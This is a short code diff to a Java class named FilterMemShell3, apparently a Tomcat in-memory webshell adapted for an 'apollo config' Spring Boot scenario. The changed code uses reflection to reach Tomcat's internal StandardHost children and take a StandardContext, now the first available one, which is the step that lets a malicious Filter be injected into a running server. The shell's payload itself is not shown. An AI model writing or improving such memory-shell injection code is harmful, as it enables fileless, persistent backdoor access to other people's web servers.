@@ -12,9 +12,12 @@ import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashMap;
+import java.util.Iterator;
+import java.util.Map;
+import java.util.Set;
 
 /**
- * for apollo config scenario
+ * for apollo config scenario in Springboot Environment
  */
 public class FilterMemShell3 implements Filter {
     static {
@@ -91,9 +94,10 @@ public class FilterMemShell3 implements Filter {
                     StandardHost o2 = (StandardHost) o1.get("localhost");
                     Field children1 = o2.getClass().getSuperclass().getDeclaredField("children");
                     children1.setAccessible(true);
-                    HashMap o3 = (HashMap) children1.get(o2);
-                    StandardContext o4 = (StandardContext) o3.get("");
-                    return o4;
+                    HashMap<String,Object> o3 = (HashMap<String,Object>) children1.get(o2);
+                    for (String k : o3.keySet()) {
+                        return (StandardContext) o3.get(k);
+                    }
                 } catch (Exception ex) {
                 }
             }
